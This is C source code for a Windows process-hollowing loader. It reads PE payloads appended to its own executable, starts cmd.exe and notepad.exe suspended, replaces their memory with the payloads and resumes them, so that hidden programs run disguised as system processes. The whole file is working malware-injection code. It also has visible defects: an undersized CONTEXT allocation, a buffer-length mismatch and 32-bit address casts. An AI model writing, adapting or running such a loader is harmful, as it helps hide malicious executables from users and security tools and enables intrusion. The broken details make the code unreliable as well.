#include <stdio.h>
#include <string.h>
#include <winnt.h>
#include <Windows.h>
#include <TlHelp32.h>

#ifdef _WIN64
#define CONTEXTAX(pCTX) pCTX->Rax
#define CONTEXTBX(pCTX) pCTX->Rbx
#else
#define CONTEXTAX(pCTX) pCTX->Eax
#define CONTEXTBX(pCTX) pCTX->Ebx
#endif

typedef struct _FILEDATA
{
    DWORD sizeCnt;
    PDWORD pSizeData;
    PBYTE *pData;
} FILEDATA, *PFILEDATA;

int RunProcessHollowing(const unsigned char *pImage, LPCTSTR szFilePath)
{
    PIMAGE_DOS_HEADER pIDH;
    PIMAGE_NT_HEADERS pINH;
    PIMAGE_SECTION_HEADER pISH;
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    CONTEXT *pCTX;
    LPVOID lpImageBase, lpTargetBase;

    pIDH = (PIMAGE_DOS_HEADER)pImage;
    pINH = (PIMAGE_NT_HEADERS)((DWORD)pImage + pIDH->e_lfanew);

    if (pINH->Signature == IMAGE_NT_SIGNATURE)
    {
        ZeroMemory(&pi, sizeof(pi));
        ZeroMemory(&si, sizeof(si));

        if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi))
        {
            pCTX = (LPCONTEXT)(VirtualAlloc(NULL, sizeof(pCTX), MEM_COMMIT, PAGE_READWRITE));
            pCTX->ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(pi.hThread, (LPCONTEXT)pCTX))
            {
                ReadProcessMemory(pi.hProcess, (LPVOID)(CONTEXTBX(pCTX) + 8), &lpImageBase, 4, 0);

                typedef LONG(WINAPI * NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
                NtUnmapViewOfSection NewNtUnmapViewOfSection;

                if ((DWORD)lpImageBase == pINH->OptionalHeader.ImageBase)
                {
                    NewNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
                    NewNtUnmapViewOfSection(pi.hProcess, lpImageBase);
                }

                lpTargetBase = VirtualAllocEx(pi.hProcess, (LPVOID)pINH->OptionalHeader.ImageBase,
                                              pINH->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

                WriteProcessMemory(pi.hProcess, lpTargetBase, pImage, pINH->OptionalHeader.SizeOfHeaders, NULL);

                for (int i = 0; i < pINH->FileHeader.NumberOfSections; i++)
                {

                    pISH = (PIMAGE_SECTION_HEADER)((DWORD)pImage + pIDH->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));

                    WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD)lpTargetBase + pISH->VirtualAddress), (LPVOID)((DWORD)pImage + pISH->PointerToRawData), pISH->SizeOfRawData, NULL);
                }

                CONTEXTAX(pCTX) = (DWORD)lpTargetBase + pINH->OptionalHeader.AddressOfEntryPoint;

                WriteProcessMemory(pi.hProcess, (PVOID)(CONTEXTBX(pCTX) + 8), &pINH->OptionalHeader.ImageBase, 4, 0);

                ReadProcessMemory(pi.hProcess, (LPVOID)(CONTEXTBX(pCTX) + 8), &lpImageBase, 4, 0);

                SetThreadContext(pi.hThread, (LPCONTEXT)pCTX);
                ResumeThread(pi.hThread);
                VirtualFree(pCTX, 0, MEM_RELEASE);
                VirtualFreeEx(pi.hProcess, lpTargetBase, pINH->OptionalHeader.SizeOfImage, MEM_RESERVE);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);

                return TRUE;
            }
        }
    }
    return FALSE;
}

int GetFileContents(HANDLE hRead, PFILEDATA pFileData)
{
    DWORD nRead, i;

    pFileData->pData = (PBYTE *)malloc(sizeof(PBYTE) * pFileData->sizeCnt);

    for (i = 0; i < pFileData->sizeCnt; i++)
    {
        pFileData->pData[i] = (BYTE *)malloc(sizeof(BYTE) * pFileData->pSizeData[i]);
        ReadFile(hRead, pFileData->pData[i], pFileData->pSizeData[i], &nRead, NULL);
    }
}

PFILEDATA GetSizeData(HANDLE hRead)
{
    PFILEDATA pFileData;
    DWORD nRead;

    pFileData = malloc(sizeof(FILEDATA));
    SetFilePointer(hRead, -4, 0, FILE_END);
    ReadFile(hRead, &pFileData->sizeCnt, 4, &nRead, NULL);
    pFileData->pSizeData = (DWORD *)malloc(sizeof(DWORD) * pFileData->sizeCnt);

    for (int i = pFileData->sizeCnt - 1; i >= 0; i--)
    {
        SetFilePointer(hRead, -8, 0, FILE_CURRENT);
        ReadFile(hRead, &pFileData->pSizeData[i], 4, &nRead, NULL);
    }

    SetFilePointer(hRead, 0, 0, FILE_BEGIN);
    return pFileData;
}

void ClearHandle(HANDLE hRead, PFILEDATA pFileData)
{
    for (int i = 0; i < pFileData->sizeCnt; i++)
    {
        free(pFileData->pData[i]);
    }
    free(pFileData->pSizeData);
    free(pFileData->pData);
    free(pFileData);
    CloseHandle(hRead);
}

int main()
{
    HANDLE hRead, hWrite;
    PFILEDATA pFileData;
    char fileName[256], dummyName[2][256], systemPath[256];

    GetSystemDirectory(systemPath, 256);
    GetModuleFileNameA(0, fileName, 1024);

    sprintf(dummyName[0], "%s\\cmd.exe", systemPath);
    sprintf(dummyName[1], "%s\\notepad.exe", systemPath);

    hRead = CreateFileA(fileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
    if (hRead == INVALID_HANDLE_VALUE)
        printf("[!] hRead CreateFile Error\n");

    pFileData = GetSizeData(hRead);
    GetFileContents(hRead, pFileData);

    if (!RunProcessHollowing(pFileData->pData[1], dummyName[0]))
        return 0;

    if (!RunProcessHollowing(pFileData->pData[2], dummyName[1]))
        return 0;

    ClearHandle(hRead, pFileData);
    return 0;
}